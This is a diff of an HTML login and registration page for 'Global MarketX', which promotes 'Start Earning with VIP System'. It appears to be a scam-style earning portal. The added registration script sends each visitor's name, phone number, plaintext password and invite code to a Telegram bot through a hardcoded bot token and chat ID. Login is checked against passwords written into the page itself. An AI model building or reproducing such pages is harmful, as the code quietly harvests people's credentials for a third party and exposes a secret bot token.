@@ -1,65 +1,117 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta name="description" content="MarketX - အကောင်းဆုံး အေးဂျင့်ဝန်ဆောင်မှုနှင့် ပစ္စည်းများ">
-<meta name="keywords" content="Online Shopping, MarketX, Agent Mall, Myanmar">
-<meta name="author" content="MarketX Team">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MarketX - Agent Login</title>
+    <title>MarketX - Welcome</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #001f3f; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
-        .login-box { background: rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px); width: 320px; text-align: center; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 8px 32px 0 rgba(0,0,0,0.37); }
-        .logo { font-size: 32px; font-weight: bold; margin-bottom: 30px; letter-spacing: 2px; }
-        .logo span { color: #007bff; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; background: rgba(255,255,255,0.9); box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; font-size: 16px; }
-        .btn:hover { background: #0056b3; }
-        .footer-links { margin-top: 25px; font-size: 13px; opacity: 0.8; }
-        a { color: #007bff; text-decoration: none; }
+        :root { --gold: #d4af37; --dark: #001f3f; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f4f7f9; }
+        
+        /* Ad Slider Area */
+        .ad-container { height: 250px; background: var(--dark); overflow: hidden; position: relative; }
+        .ad-slide { width: 100%; height: 100%; object-fit: cover; }
+        .welcome-text { position: absolute; bottom: 20px; left: 20px; color: white; text-shadow: 2px 2px 5px rgba(0,0,0,0.5); }
+
+        /* Form Area */
+        .form-box { padding: 30px 20px; margin-top: -30px; background: white; border-radius: 30px 30px 0 0; position: relative; }
+        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; }
+        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; color: #888; font-weight: bold; }
+        .tab.active { color: var(--dark); border-bottom: 3px solid var(--dark); }
+
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .main-btn { width: 100%; padding: 15px; background: var(--dark); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        
+        #register-form { display: none; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <div class="logo">Market<span>X</span></div>
-        <p>Agent Portal Login</p>
-        <form action="dashboard.html">
-            <input type="text" placeholder="Username / Phone" required>
-            <input type="password" placeholder="Password" required>
-            <button type="submit" class="btn">Sign In</button>
-        </form>
-        <div class="footer-links">
-            Don't have an account? <a href="register.html">Register Now</a><br><br>
-            <a href="#" style="color: white;">Download MarketX App</a>
+
+    <div class="ad-container">
+        <img src="https://images.unsplash.com/photo-1607082348824-0a96f2a4b9da?q=80&w=800" class="ad-slide">
+        <div class="welcome-text">
+            <h2 style="margin:0;">Global MarketX</h2>
+            <p style="margin:0;">Start Earning with VIP System</p>
         </div>
     </div>
-    <script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/65c36e3e8d261e0359ab656e/default';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<script>
-    function login() {
-        const user = document.getElementById('username').value;
-        const pass = document.getElementById('password').value;
 
-        // ဒီနေရာမှာ သင်ပေးချင်တဲ့ Password ကို ပြင်လို့ရပါတယ်
-        const correctPassword = "admin123"; 
+    <div class="form-box">
+        <div class="tabs">
+            <div class="tab active" onclick="showTab('login')">LOGIN</div>
+            <div class="tab" onclick="showTab('register')">REGISTER</div>
+        </div>
 
-        if (pass === correctPassword) {
-            alert("Welcome back, " + user + "!");
+        <div id="login-form">
+            <input type="text" id="login-phone" placeholder="Phone Number">
+            <input type="password" id="login-pass" placeholder="Password">
+            <button class="main-btn" onclick="handleLogin()">Sign In</button>
+        </div>
+
+        <div id="register-form">
+            <input type="text" id="reg-name" placeholder="Full Name">
+            <input type="text" id="reg-phone" placeholder="Phone Number">
+            <input type="password" id="reg-pass" placeholder="Password">
+            <input type="text" id="reg-invite" placeholder="Invitation Code (Optional)">
+            <button class="main-btn" onclick="handleRegister()" style="background: var(--gold);">Create Account</button>
+        </div>
+    </div>
+
+    <script>
+    function showTab(type) {
+        document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none';
+        document.getElementById('register-form').style.display = type === 'register' ? 'block' : 'none';
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        // tab class ကို target ထားပြီး active ပြောင်းခြင်း
+        if(event) {
+            event.target.classList.add('active');
+        }
+    }
+
+    // Register တင်သည့်စနစ်
+    function handleRegister() {
+        const name = document.getElementById('reg-name').value;
+        const phone = document.getElementById('reg-phone').value;
+        const invite = document.getElementById('reg-invite').value;
+        const pass = document.getElementById('reg-pass').value;
+
+        if(!name || !phone || !pass) {
+            alert("ကျေးဇူးပြု၍ အချက်အလက်များ အပြည့်အစုံဖြည့်ပါ။");
+            return;
+        }
+
+        const token = "8444757495:AAG6kOwh8r_hHFyyRWcXctnK0Ym1Z7pKbzU"; // သင့် Bot Token
+        const chat_id = "6698333806"; // သင့် Chat ID
+
+        const msg = `🆕 Register Request\n\n👤 Name: ${name}\n📱 Phone: ${phone}\n🔑 Pass: ${pass}\n🎟 Invite: ${invite || 'None'}`;
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
+
+        fetch(url).then(() => {
+            alert("စာရင်းသွင်းမှု တင်ပြပြီးပါပြီ။ Admin မှ အကောင့်ဖွင့်ပေးသည်အထိ ခဏစောင့်ပေးပါ။");
+            showTab('login');
+        });
+    }
+
+    // Login စစ်ဆေးသည့်စနစ်
+    function handleLogin() {
+        const phone = document.getElementById('login-phone').value;
+        const pass = document.getElementById('login-pass').value;
+
+        // အရေးကြီးသည်- ဤနေရာတွင် သင် Approve ပေးထားသော ဖုန်းနံပါတ်နှင့် Password များကို လက်ဖြင့် ထည့်ရပါမည်။
+        // နမူနာအနေဖြင့် အောက်ပါအတိုင်း စစ်ဆေးပါမည်။
+        
+        const approvedUsers = [
+            { phone: "09123456789", pass: "123456" },
+            { phone: "09777888999", pass: "password123" }
+        ];
+
+        const userFound = approvedUsers.find(u => u.phone === phone && u.pass === pass);
+
+        if (userFound) {
+            alert("Login Successful!");
             window.location.href = "dashboard.html";
         } else {
-            alert("Password မှားယွင်းနေပါသည်။ ပြန်ပွားစစ်ဆေးပါ။");
+            alert("အကောင့်မရှိသေးပါ သို့မဟုတ် Admin ၏ အတည်ပြုချက်ကို စောင့်ဆိုင်းနေဆဲဖြစ်သည်။");
         }
     }
 </script>
-
-
 
